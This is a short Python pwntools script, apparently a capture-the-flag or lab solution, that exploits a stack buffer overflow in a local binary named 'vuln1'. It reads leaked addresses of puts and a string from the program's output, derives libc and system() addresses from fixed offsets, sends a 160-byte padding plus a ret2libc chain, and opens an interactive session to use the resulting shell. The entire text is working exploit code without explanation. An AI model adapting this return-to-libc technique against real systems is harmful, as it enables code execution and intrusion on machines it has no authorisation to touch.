
from pwn import *

p = process("./vuln1")

string = p.recv()

puts_address = string[41:50]
int_puts_address = int(puts_address,16)

useful_string_address = string[118:128]
int_useful_string_address = int(useful_string_address,16)



int_libc_address = int_puts_address - 424768
libc_address = hex(int_libc_address)

int_systems_address = int_puts_address - 174400
systems_address = (hex(int_systems_address))



p.sendline("A"*160 + p32(int_systems_address) + p32(int_libc_address) + p32(int_useful_string_address))

p.interactive()

